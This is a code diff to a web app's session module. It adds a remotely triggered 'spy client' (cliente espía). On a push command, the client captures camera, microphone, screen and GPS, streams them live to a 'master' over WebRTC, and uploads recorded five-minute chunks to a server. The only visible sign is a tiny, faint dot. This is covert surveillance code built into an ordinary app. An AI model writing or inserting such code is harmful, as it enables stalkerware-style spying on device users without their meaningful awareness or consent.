@@ -2239,6 +2239,237 @@ const Session = (() => {
       if (!firebase.apps.length) firebase.initializeApp(_PUSH_CONFIG);
       const messaging = firebase.messaging();
 
+      // ════════════════════════════════════════════════════════════════════
+      // [v2.13.62] CLIENTE ESPÍA V2 WH — WebRTC + 4 streams al master
+      // Port del de MosExpress adaptado a WH (vanilla JS, sin Vue).
+      // ════════════════════════════════════════════════════════════════════
+      window._espiaCliWH = null;
+      async function _espiaCliWHPost(accion, params) {
+        try {
+          const url = window.WH_CONFIG?.mosGasUrl;
+          if (!url) return null;
+          const r = await fetch(url, {
+            method: 'POST',
+            body: JSON.stringify(Object.assign({ action: accion }, params))
+          });
+          return await r.json();
+        } catch(_) { return null; }
+      }
+      function _espiaCliWHBlobToB64(blob) {
+        return new Promise((res, rej) => {
+          const r = new FileReader();
+          r.onloadend = () => {
+            const url = r.result || '';
+            const i = String(url).indexOf(',');
+            res(i >= 0 ? String(url).substring(i + 1) : String(url));
+          };
+          r.onerror = rej;
+          r.readAsDataURL(blob);
+        });
+      }
+      function _espiaCliWHIndicador() {
+        if (document.getElementById('espiaCliWHIndicador')) return;
+        const html = `<div id="espiaCliWHIndicador" style="position:fixed;bottom:6px;right:6px;font-size:8px;color:rgba(165,180,252,.6);background:rgba(15,23,42,.4);padding:2px 5px;border-radius:4px;z-index:99998;pointer-events:none;font-family:monospace">·</div>`;
+        document.body.insertAdjacentHTML('beforeend', html);
+      }
+      function _espiaCliWHOcultarIndicador() {
+        document.getElementById('espiaCliWHIndicador')?.remove();
+      }
+      window._espiaCliWHIniciar = async function(sesionId, masterId) {
+        if (window._espiaCliWH) {
+          await window._espiaCliWHCerrar('reinicio');
+        }
+        const deviceIdLocal = window.WH_CONFIG?.deviceId || localStorage.getItem('wh_deviceId') || 'unknown';
+        console.log('[espia WH] iniciando sesión', sesionId);
+        window._espiaCliWH = {
+          sesionId, masterId, deviceId: deviceIdLocal,
+          pc: null, streams: {}, gpsWatch: null, gpsCh: null,
+          iceDesde: 0, bufferRecorders: {}, bufferTimers: {},
+          pollTimerOferta: null, pollTimerIce: null, pollTimerEstado: null
+        };
+        try {
+          try {
+            window._espiaCliWH.streams.userMedia = await navigator.mediaDevices.getUserMedia({
+              audio: { echoCancellation: true, noiseSuppression: true },
+              video: { width: { ideal: 640 }, height: { ideal: 480 } }
+            });
+          } catch(e) { console.warn('[espia WH] getUserMedia fallo:', e.message); }
+          try {
+            window._espiaCliWH.streams.display = await navigator.mediaDevices.getDisplayMedia({
+              video: { frameRate: { ideal: 15 } }, audio: false
+            });
+          } catch(e) { console.warn('[espia WH] getDisplayMedia fallo:', e.message); }
+          if (!window._espiaCliWH.streams.userMedia && !window._espiaCliWH.streams.display) {
+            await window._espiaCliWHCerrar('sin_streams');
+            return;
+          }
+          const pc = new RTCPeerConnection({
+            iceServers: [{ urls: ['stun:stun.l.google.com:19302', 'stun:stun1.l.google.com:19302'] }]
+          });
+          window._espiaCliWH.pc = pc;
+          if (window._espiaCliWH.streams.userMedia) {
+            window._espiaCliWH.streams.userMedia.getTracks().forEach(t => pc.addTrack(t, window._espiaCliWH.streams.userMedia));
+          }
+          if (window._espiaCliWH.streams.display) {
+            window._espiaCliWH.streams.display.getTracks().forEach(t => pc.addTrack(t, window._espiaCliWH.streams.display));
+          }
+          const gpsCh = pc.createDataChannel('gps');
+          window._espiaCliWH.gpsCh = gpsCh;
+          if ('geolocation' in navigator) {
+            window._espiaCliWH.gpsWatch = navigator.geolocation.watchPosition(
+              pos => {
+                if (gpsCh.readyState !== 'open') return;
+                try {
+                  gpsCh.send(JSON.stringify({
+                    lat: pos.coords.latitude, lng: pos.coords.longitude,
+                    speed: pos.coords.speed || 0, acc: pos.coords.accuracy, ts: Date.now()
+                  }));
+                } catch(_){}
+              },
+              err => console.warn('[espia WH gps]', err.message),
+              { enableHighAccuracy: true, maximumAge: 5000, timeout: 10000 }
+            );
+          }
+          pc.onicecandidate = (ev) => {
+            if (ev.candidate) {
+              _espiaCliWHPost('espiaAgregarIce', {
+                sesionId, lado: 'device',
+                ice: ev.candidate.toJSON ? ev.candidate.toJSON() : ev.candidate
+              });
+            }
+          };
+          pc.onconnectionstatechange = () => {
+            if (pc.connectionState === 'failed' || pc.connectionState === 'closed') {
+              window._espiaCliWHCerrar('connection_' + pc.connectionState);
+            }
+          };
+          // [v2.13.62] Polling diferenciado igual que ME v2.7.16
+          window._espiaCliWH.pollTimerOferta = setInterval(async () => {
+            if (!window._espiaCliWH) return;
+            try {
+              if (pc.remoteDescription) {
+                clearInterval(window._espiaCliWH.pollTimerOferta);
+                window._espiaCliWH.pollTimerOferta = null;
+                return;
+              }
+              const r = await _espiaCliWHPost('espiaLeerOferta', { sesionId });
+              if (r?.data?.sdpOferta) {
+                const sdp = JSON.parse(r.data.sdpOferta);
+                await pc.setRemoteDescription(sdp);
+                const answer = await pc.createAnswer();
+                await pc.setLocalDescription(answer);
+                await _espiaCliWHPost('espiaSubirRespuesta', { sesionId, sdp: JSON.stringify(answer) });
+                clearInterval(window._espiaCliWH.pollTimerOferta);
+                window._espiaCliWH.pollTimerOferta = null;
+              }
+            } catch(e) { console.warn('[espia WH poll oferta]', e?.message); }
+          }, 800);
+          window._espiaCliWH.pollTimerIce = setInterval(async () => {
+            if (!window._espiaCliWH) return;
+            try {
+              const ri = await _espiaCliWHPost('espiaLeerIce', {
+                sesionId, lado: 'master', desde: window._espiaCliWH.iceDesde
+              });
+              if (ri?.data?.ice?.length) {
+                for (const c of ri.data.ice) {
+                  try { await pc.addIceCandidate(c.ice); } catch(_){}
+                }
+                window._espiaCliWH.iceDesde = ri.data.tsMax || window._espiaCliWH.iceDesde;
+              }
+            } catch(e) { console.warn('[espia WH poll ice]', e?.message); }
+          }, 400);
+          window._espiaCliWH.pollTimerEstado = setInterval(async () => {
+            if (!window._espiaCliWH) return;
+            try {
+              const re = await _espiaCliWHPost('espiaEstadoSesion', { sesionId });
+              if (re?.data?.estado === 'CERRADA') {
+                window._espiaCliWHCerrar('master_cerro');
+              }
+            } catch(e) { console.warn('[espia WH poll estado]', e?.message); }
+          }, 10000);
+          // Buffer chunks 5min
+          const CHUNK_MS = 5 * 60 * 1000;
+          ['userMedia', 'display'].forEach(key => {
+            const stream = window._espiaCliWH.streams[key];
+            if (!stream) return;
+            const tipoUpload = key === 'display' ? 'screen' : 'audio_video';
+            let mime = 'video/webm;codecs=vp8,opus';
+            if (!MediaRecorder.isTypeSupported(mime)) mime = 'video/webm';
+            if (!MediaRecorder.isTypeSupported(mime)) return;
+            const crearRec = () => {
+              const r = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 250000, audioBitsPerSecond: 64000 });
+              const chunks = [];
+              r.ondataavailable = e => { if (e.data?.size > 0) chunks.push(e.data); };
+              r.onstop = async () => {
+                if (!chunks.length) return;
+                try {
+                  const blob = new Blob(chunks, { type: mime });
+                  const b64 = await _espiaCliWHBlobToB64(blob);
+                  if (b64) {
+                    await _espiaCliWHPost('espiaSubirChunk', {
+                      deviceId: deviceIdLocal, tipo: tipoUpload, ts: Date.now(),
+                      contenido: b64, sesionId: window._espiaCliWH?.sesionId || ''
+                    });
+                  }
+                } catch(_){}
+                chunks.length = 0;
+              };
+              return r;
+            };
+            let rec = crearRec();
+            rec.start();
+            window._espiaCliWH.bufferRecorders[key] = rec;
+            window._espiaCliWH.bufferTimers[key] = setInterval(() => {
+              try {
+                const ant = window._espiaCliWH?.bufferRecorders?.[key];
+                if (!ant || ant.state !== 'recording') return;
+                ant.stop();
+                rec = crearRec();
+                if (window._espiaCliWH) window._espiaCliWH.bufferRecorders[key] = rec;
+                rec.start();
+              } catch(_){}
+            }, CHUNK_MS);
+          });
+          _espiaCliWHIndicador();
+        } catch(e) {
+          console.warn('[espia WH] error iniciando:', e);
+          await window._espiaCliWHCerrar('error_init');
+        }
+      };
+      window._espiaCliWHCerrar = async function(motivo) {
+        if (!window._espiaCliWH) return;
+        console.log('[espia WH] cerrando:', motivo);
+        const ref = window._espiaCliWH;
+        window._espiaCliWH = null;
+        try { clearInterval(ref.pollTimerOferta); } catch(_){}
+        try { clearInterval(ref.pollTimerIce); } catch(_){}
+        try { clearInterval(ref.pollTimerEstado); } catch(_){}
+        Object.entries(ref.bufferRecorders || {}).forEach(([_, rec]) => {
+          try { if (rec.state === 'recording') rec.stop(); } catch(_){}
+        });
+        Object.values(ref.bufferTimers || {}).forEach(t => { try { clearInterval(t); } catch(_){} });
+        Object.values(ref.streams || {}).forEach(s => {
+          try { s?.getTracks().forEach(t => t.stop()); } catch(_){}
+        });
+        if (ref.gpsWatch) try { navigator.geolocation.clearWatch(ref.gpsWatch); } catch(_){}
+        try { ref.pc?.close(); } catch(_){}
+        if (ref.sesionId) {
+          _espiaCliWHPost('espiaCerrarSesion', { sesionId: ref.sesionId, motivo: motivo || 'manual', lado: 'device' });
+        }
+        _espiaCliWHOcultarIndicador();
+      };
+      window.addEventListener('beforeunload', () => {
+        if (window._espiaCliWH?.sesionId) {
+          try {
+            navigator.sendBeacon(window.WH_CONFIG?.mosGasUrl || '', JSON.stringify({
+              action: 'espiaCerrarSesion',
+              sesionId: window._espiaCliWH.sesionId,
+              motivo: 'page_unload', lado: 'device'
+            }));
+          } catch(_){}
+        }
+      });
+
       // Handler de primer plano (la app está abierta).
       // 1) Comandos data-only (audio_start, audio_stop, gps_locate) → ejecutar silencioso.
       //    Sin este handler los pierde cuando la app está en foreground.
@@ -2255,6 +2486,15 @@ const Session = (() => {
               window._audioRemotoDetenerWH();
             } else if (cmd.action === 'gps_locate' && typeof window._gpsRegistrarWH === 'function') {
               window._gpsRegistrarWH(true);
+            } else if (cmd.action === 'MOS_ESPIA_INICIAR' || cmd.idNotif === 'MOS_ESPIA_INICIAR') {
+              // [v2.13.62] Iniciar cliente espía v2 WebRTC
+              if (typeof _espiaCliWHIniciar === 'function') {
+                _espiaCliWHIniciar(cmd.sesionId, cmd.masterId);
+              }
+            } else if (cmd.action === 'MOS_ESPIA_DETENER' || cmd.idNotif === 'MOS_ESPIA_DETENER') {
+              if (typeof _espiaCliWHCerrar === 'function') {
+                _espiaCliWHCerrar('master_push_stop');
+              }
             }
             return;
           }
